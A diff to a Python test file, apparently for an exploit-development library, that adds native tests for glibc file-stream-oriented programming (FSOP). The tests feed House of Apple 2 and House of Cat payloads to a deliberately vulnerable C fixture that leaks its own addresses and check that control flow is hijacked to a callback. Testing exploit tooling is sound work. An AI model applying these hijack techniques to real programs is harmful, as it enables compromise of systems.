@@ -20,9 +20,16 @@ from dataclasses import dataclass
 from pathlib import Path
 
 from payloads import (
+    FSOP,
     Address,
     Architecture,
+    FSOPActivation,
+    FSOPFamily,
+    FSOPStream,
+    FSOPTechnique,
     Image,
+    IOJumpSlot,
+    IOVtableBounds,
     LibcBoundAddress,
     LibcImage,
     Linkage,
@@ -60,6 +67,79 @@ _PROBE_SOURCE = r"""
 int main(void) {
     void *handle = dlopen("libc.so.6", RTLD_NOW | RTLD_LOCAL);
     return handle == NULL;
+}
+"""
+
+_FSOP_SOURCE = r"""
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <errno.h>
+#include <gnu/libc-version.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+_Alignas(16) static unsigned char pwnc_file[512];
+_Alignas(16) static unsigned char pwnc_aux[4096];
+
+__attribute__((noreturn)) static int pwnc_callback(void *fp) {
+    static const char marker[] = "PWNC_NATIVE_FSOP_OK";
+    (void) fp;
+    (void) write(STDOUT_FILENO, marker, sizeof(marker) - 1);
+    _exit(0);
+}
+
+static int read_exact(int fd, void *buffer, size_t size) {
+    unsigned char *cursor = buffer;
+    while (size != 0) {
+        ssize_t count = read(fd, cursor, size);
+        if (count > 0) {
+            cursor += (size_t) count;
+            size -= (size_t) count;
+            continue;
+        }
+        if (count < 0 && errno == EINTR)
+            continue;
+        return -1;
+    }
+    return 0;
+}
+
+int main(int argc, char **argv) {
+    void *handle;
+    void *wfile_jumps;
+    Dl_info owner;
+    uint32_t sizes[2];
+
+    if (argc != 2)
+        return 90;
+    handle = dlopen("libc.so.6", RTLD_NOW | RTLD_LOCAL);
+    if (handle == NULL)
+        return 91;
+    wfile_jumps = dlsym(handle, "_IO_wfile_jumps");
+    if (wfile_jumps == NULL || dladdr(wfile_jumps, &owner) == 0)
+        return 92;
+    if (printf("%s\t%p\t%s\t%p\t%p\t%p\n",
+               owner.dli_fname, owner.dli_fbase, gnu_get_libc_version(),
+               (void *) pwnc_file, (void *) pwnc_aux, (void *) pwnc_callback) < 0
+        || fflush(stdout) != 0)
+        return 93;
+    if (read_exact(STDIN_FILENO, sizes, sizeof(sizes)) != 0)
+        return 94;
+    if (sizes[0] > sizeof(pwnc_file) || sizes[1] > sizeof(pwnc_aux))
+        return 95;
+    if (read_exact(STDIN_FILENO, pwnc_file, sizes[0]) != 0
+        || read_exact(STDIN_FILENO, pwnc_aux, sizes[1]) != 0)
+        return 96;
+
+    if (strcmp(argv[1], "fflush") == 0)
+        (void) fflush((FILE *) pwnc_file);
+    else if (strcmp(argv[1], "seek") == 0)
+        (void) fseek((FILE *) pwnc_file, 0, SEEK_SET);
+    else
+        return 97;
+    return 98;
 }
 """
 
@@ -165,11 +245,11 @@ def _read_process_line(process: subprocess.Popen[bytes], timeout: int = 10) -> b
     assert process.stdout is not None
     ready, _, _ = select.select((process.stdout,), (), (), timeout)
     if not ready:
-        raise AssertionError("timed out waiting for the native ret2libc fixture leak")
+        raise AssertionError("timed out waiting for the native fixture disclosure")
     line = process.stdout.readline()
     if not line:
         stderr = process.stderr.read().decode(errors="replace") if process.stderr is not None else ""
-        raise AssertionError(f"native ret2libc fixture exited before disclosing libc: {stderr}")
+        raise AssertionError(f"native fixture exited before disclosing runtime addresses: {stderr}")
     return line.rstrip(b"\n")
 
 
@@ -373,6 +453,107 @@ class NativeStaticRopTests(unittest.TestCase):
 
                 self.assertEqual(syscall_run.returncode, 43, syscall_run.stderr.decode(errors="replace"))
                 self.assertEqual(call_run.returncode, 42, call_run.stderr.decode(errors="replace"))
+
+
+@unittest.skipUnless(
+    _NATIVE_OPT_IN,
+    "set PWNC_NATIVE_TESTS=1 to run direct Linux i386 and AMD64 execution tests",
+)
+class NativeFSOPTests(unittest.TestCase):
+    @classmethod
+    def setUpClass(cls) -> None:
+        super().setUpClass()
+        _require_native_prerequisites()
+
+    def test_wide_fflush_and_seek_routes_dispatch_on_both_native_x86_modes(self) -> None:
+        routes = (
+            ("fflush", FSOPActivation.FFLUSH, IOJumpSlot.DOALLOCATE, FSOPTechnique.HOUSE_OF_APPLE_2),
+            ("seek", FSOPActivation.SEEK, IOJumpSlot.OVERFLOW, FSOPTechnique.HOUSE_OF_CAT),
+        )
+        for target in _NATIVE_TARGETS:
+            with tempfile.TemporaryDirectory(prefix="pwnc-native-fsop-") as directory:
+                executable = Path(directory, "fixture")
+                compiled = _compile_c(_FSOP_SOURCE, executable, target.bits)
+                self.assertEqual(compiled.returncode, 0, compiled.stdout + compiled.stderr)
+                profile = inspect_elf(executable)
+                self.assertEqual(profile.target, target)
+                self.assertFalse(profile.pie)
+                self.assertIs(profile.linkage, Linkage.DYNAMIC)
+
+                for route, activation, slot, technique in routes:
+                    with self.subTest(target=target.name, route=route):
+                        process = subprocess.Popen(
+                            [str(executable), route],
+                            stdin=subprocess.PIPE,
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE,
+                            env=_native_environment(),
+                        )
+                        try:
+                            fields = _read_process_line(process).split(b"\t")
+                            self.assertEqual(len(fields), 6, fields)
+                            libc_path = Path(os.fsdecode(fields[0])).resolve(strict=True)
+                            libc_base = int(fields[1], 16)
+                            glibc_version = fields[2].decode("ascii")
+                            file_address = int(fields[3], 16)
+                            auxiliary_address = int(fields[4], 16)
+                            callback_address = int(fields[5], 16)
+
+                            self.assertEqual(file_address, profile.symbol_offsets["pwnc_file"])
+                            self.assertEqual(auxiliary_address, profile.symbol_offsets["pwnc_aux"])
+                            self.assertEqual(callback_address, profile.symbol_offsets["pwnc_callback"])
+                            libc_maps = _artifact_mappings(_read_proc_maps(process), libc_path)
+                            self.assertTrue(libc_maps)
+                            self.assertEqual({item.start for item in libc_maps if item.offset == 0}, {libc_base})
+
+                            libc = LibcImage.from_file(
+                                libc_path,
+                                symbols=("_IO_file_jumps", "_IO_wfile_jumps"),
+                                glibc_version=glibc_version,
+                            )
+                            self.assertEqual(libc.target, target)
+                            bounds = IOVtableBounds.from_libc_offsets(
+                                libc,
+                                libc.offset("_IO_file_jumps"),
+                                libc.offset("_IO_wfile_jumps") + 21 * target.word_size,
+                                source="native fixture exact glibc jump-table span",
+                            )
+                            payload = FSOP(
+                                libc,
+                                stream=FSOPStream.HEAP,
+                                family=FSOPFamily.WIDE,
+                                address=file_address,
+                                storage=auxiliary_address,
+                                io_vtables=bounds,
+                                glibc_version=glibc_version,
+                            ).build(activation, callback_address, slot=slot)
+                            self.assertIs(payload.technique, technique)
+
+                            materialized = payload.materialize(RuntimeLayout(libc_base=libc_base))
+                            file_write = next(item for item in materialized if item.placement == "file")
+                            auxiliary_writes = [item for item in materialized if item.placement != "file"]
+                            self.assertEqual(file_write.address, file_address)
+                            self.assertTrue(auxiliary_writes)
+                            self.assertTrue(all(item.address >= auxiliary_address for item in auxiliary_writes))
+                            auxiliary_end = max(item.address + len(item.data) for item in auxiliary_writes)
+                            auxiliary = bytearray(auxiliary_end - auxiliary_address)
+                            for item in auxiliary_writes:
+                                start = item.address - auxiliary_address
+                                auxiliary[start : start + len(item.data)] = item.data
+
+                            protocol = (
+                                len(file_write.data).to_bytes(4, "little")
+                                + len(auxiliary).to_bytes(4, "little")
+                                + file_write.data
+                                + bytes(auxiliary)
+                            )
+                            stdout, stderr = process.communicate(protocol, timeout=10)
+                            self.assertEqual(process.returncode, 0, stderr.decode(errors="replace"))
+                            self.assertEqual(stdout, b"PWNC_NATIVE_FSOP_OK")
+                        finally:
+                            if process.poll() is None:
+                                process.kill()
+                            process.communicate()
 
 
 @unittest.skipUnless(
